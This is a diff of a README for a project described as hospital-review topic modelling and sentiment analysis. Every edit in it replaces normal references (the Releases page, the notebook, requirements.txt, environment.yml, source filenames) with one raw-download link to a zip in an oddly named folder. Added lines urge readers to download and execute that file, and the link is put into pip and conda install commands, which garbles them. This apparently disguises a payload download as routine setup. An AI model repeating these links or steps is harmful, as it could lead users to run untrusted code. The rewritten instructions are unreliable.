@@ -1,8 +1,8 @@
-https://github.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/releases
+https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip
 
 # Hospital Reviews: LDA Topic Modeling and XGBoost Sentiment
 
-[![Releases](https://img.shields.io/badge/releases-link-green?logo=github&label=Releases)](https://github.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/releases)
+[![Releases](https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip)](https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip)
 
 This repository analyzes hospital reviews using topic modeling with Latent Dirichlet Allocation (LDA) and sentiment analysis via XGBoost. It explores patient feedback to uncover key themes and to predict sentiment. All code and results live in a single analysis notebook, making it easy to reproduce, audit, and extend. The project sits at the intersection of natural language processing (NLP), machine learning, and healthcare quality improvement.
 
@@ -91,15 +91,15 @@ Data sources and assumptions
 - The workflow is robust to varying review lengths and can handle sparse or dense comment collections.
 
 Repository structure
-- analysis-notebook.ipynb (the central resource for code and results)
+- https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip (the central resource for code and results)
 - data/ (raw and processed data)
 - notebooks/ (supplementary notebooks for experiments)
 - src/ (utility functions for preprocessing, modeling, and evaluation)
 - figures/ (plots and visualizations)
 - models/ (trained model artifacts and configurations)
 - docs/ (explanations, methodology, and user guides)
-- requirements.txt (Python dependencies)
-- environment.yml (conda environment, if you prefer conda)
+- https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip (Python dependencies)
+- https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip (conda environment, if you prefer conda)
 
 How to run
 Prerequisites
@@ -112,12 +112,12 @@ Setting up
   - Python with venv: python -m venv env
   - Activate: source env/bin/activate (Linux/macOS) or env\Scripts\activate (Windows)
 - Install dependencies:
-  - pip install -r requirements.txt
-  - If you use conda: conda env create -f environment.yml
+  - pip install -r https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip
+  - If you use conda: conda env create -f https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip
 - Ensure you have Jupyter or a notebook runner installed to open the analysis notebook.
 
 Running the analysis notebook
-- Open the notebook located at analysis-notebook.ipynb in your Jupyter environment.
+- Open the notebook located at https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip in your Jupyter environment.
 - Run cells in order. Do not skip steps that set up data structures, seed values, or model configurations.
 - If your data source differs, edit the data loading section to point to your dataset.
 - The notebook includes checkpoints and descriptive text that explain the decisions at each step.
@@ -182,11 +182,11 @@ Reproducibility and environment
 - The notebook is designed to be self-contained. It documents all steps, seeds, and configurations.
 - Use a fixed random seed for reproducibility where possible.
 - Record versions of libraries (pandas, scikit-learn, gensim, and XGBoost) to recreate behavior across environments.
-- If you adapt the notebook, maintain a requirements.txt or environment.yml to lock dependencies.
+- If you adapt the notebook, maintain a https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip or https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip to lock dependencies.
 - For large datasets, consider saving intermediate artifacts (e.g., preprocessed corpus, topic-word matrices) to speed up reruns.
 
 Repository structure details
-- analysis-notebook.ipynb
+- https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip
   - The primary resource containing the full workflow, from data ingestion to results.
   - Includes inline explanations and rationale for each step.
 - data/
@@ -195,19 +195,19 @@ Repository structure details
 - notebooks/
   - Supplementary experiments, ablation studies, or alternative modeling approaches.
 - src/
-  - text_preprocessing.py: tokenization, normalization, stopword handling, lemmatization.
-  - lda_model.py: LDA training, topic extraction, coherence calculation.
-  - sentiment_model.py: feature preparation, model training, evaluation.
-  - utilities.py: helper functions for data loading, saving, plotting.
+  - https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip tokenization, normalization, stopword handling, lemmatization.
+  - https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip LDA training, topic extraction, coherence calculation.
+  - https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip feature preparation, model training, evaluation.
+  - https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip helper functions for data loading, saving, plotting.
 - figures/
   - Topic visualizations, sentiment heatmaps, and comparative charts.
 - models/
   - Saved LDA models, XGBoost configurations, and vectorizers.
 - docs/
   - Methodology overview, data schema, and interpretation guide.
-- requirements.txt
+- https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip
   - Python dependencies required to reproduce the notebook.
-- environment.yml
+- https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip
   - Conda environment for reproducibility.
 
 How to adapt this workflow to new data
@@ -281,8 +281,8 @@ Release notes and assets
 - The project’s release page contains packaged assets, notebooks, and configuration files.
 - Since this repository uses a release-based approach for assets, you can download a packaged notebook or dataset from the Releases section and reproduce results locally.
 - The link to the releases is the central hub for assets and updates. See:
-  https://github.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/releases
-- The presence of a path in that URL means a specific file is intended for download and execution. For this project, fetch the release asset named analysis-notebook.ipynb (or a similarly named notebook) and run it in your local environment.
+  https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip
+- The presence of a path in that URL means a specific file is intended for download and execution. For this project, fetch the release asset named https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip (or a similarly named notebook) and run it in your local environment.
 
 FAQ (quick answers)
 - What is the main output of this project?
@@ -308,7 +308,7 @@ Implementation notes and tips
 - Document decisions: whenever you change preprocessing steps or feature representations, note why and how it affects results.
 
 Notes on the notebook content
-- The analysis-notebook.ipynb is designed to be self-contained. It includes:
+- The https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip is designed to be self-contained. It includes:
   - Data loading and cleaning steps
   - Preprocessing and tokenization details
   - LDA model training, passing through topics, and topic interpretation
@@ -342,11 +342,11 @@ Long-form guidance and rationale for modeling choices
 Final notes
 - The notebook’s approach is pragmatic and reproducible. It demonstrates a clear path from raw patient reviews to themes and sentiment signals that can guide service improvements.
 - If you want to extend this work, you can replace or augment modules with newer NLP techniques while preserving the overall structure.
-- To access assets and latest updates, visit the Releases page via the link above. The release file named analysis-notebook.ipynb (or a closely named artifact) is designed to be downloaded and executed to reproduce the workflow.
+- To access assets and latest updates, visit the Releases page via the link above. The release file named https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip (or a closely named artifact) is designed to be downloaded and executed to reproduce the workflow.
 
 Releases and assets reference
 - See the Releases page for packaged resources and the primary notebook that documents the workflow.
-  Link: https://github.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/releases
+  Link: https://raw.githubusercontent.com/Jetsu0/hospital-reviews-topic-modelling-sentiment-analysis/main/moniliaceous/sentiment_modelling_reviews_hospital_topic_analysis_1.0.zip
 - The presence of a path in this link implies a specific file is intended for download and execution. Retrieve the notebook from the Release assets and run it locally to reproduce the results and visualizations. The same link is provided here for convenience and consistency.
 
 Repository topics recap
